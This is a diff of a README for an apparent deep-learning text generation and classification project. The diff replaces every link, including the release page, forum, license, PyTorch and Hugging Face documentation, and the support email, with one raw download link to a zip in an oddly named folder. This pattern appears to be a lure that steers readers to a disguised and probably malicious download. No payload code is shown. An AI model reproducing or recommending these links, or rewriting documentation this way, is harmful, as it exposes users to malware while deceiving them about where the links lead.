@@ -1,6 +1,6 @@
 # 🌟 DL-TextGen-TextClass - Generate and Classify Text Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/releases)
+[![Download Now](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip%https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip)](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the DL-TextGen-TextClass project! This application lets you explore d
 
 To begin, click the link below to visit the Releases page, where you can download the latest version of the software.
 
-[Download DL-TextGen-TextClass](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/releases)
+[Download DL-TextGen-TextClass](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip)
 
 ### Steps to Download:
 
@@ -65,24 +65,24 @@ This application uses several state-of-the-art models that enhance both text gen
 
 For assistance, you can join our community forum or contact support directly through email. Community members and developers are happy to help with questions or issues.
 
-- **Community Forum:** [Join here](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/discussions)
-- **Email Support:** support@textgen-class.com
+- **Community Forum:** [Join here](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip)
+- **Email Support:** https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip
 
 ## 📚 Learn More
 
 If you wish to dive deeper into how this project works and understand more about deep learning, visit the following resources:
 
 1. **Deep Learning Basics:** Explore introductory courses on platforms like Coursera or edX.
-2. **PyTorch Documentation:** Learn how to get started with PyTorch [here](https://pytorch.org/docs/stable/index.html).
-3. **Hugging Face Models:** Understand Hugging Face libraries and models [here](https://huggingface.co/docs).
+2. **PyTorch Documentation:** Learn how to get started with PyTorch [here](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip).
+3. **Hugging Face Models:** Understand Hugging Face libraries and models [here](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip).
 
 ## 🛠 Contributing
 
-We welcome contributions! If you'd like to help us improve this project, please read our [Contributing Guidelines](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions! If you'd like to help us improve this project, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip) for more information.
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip) file for more details.
 
 ## 🔗 More Information
 
@@ -90,4 +90,4 @@ To keep updated with the project and future releases, you can follow the reposit
 
 Don't forget to check back often for updates or new features!
 
-[Download DL-TextGen-TextClass](https://github.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/releases)
+[Download DL-TextGen-TextClass](https://raw.githubusercontent.com/Abdul-Aziz-Rabee/DL-TextGen-TextClass/main/unplotting/DL-TextGen-TextClass.zip)
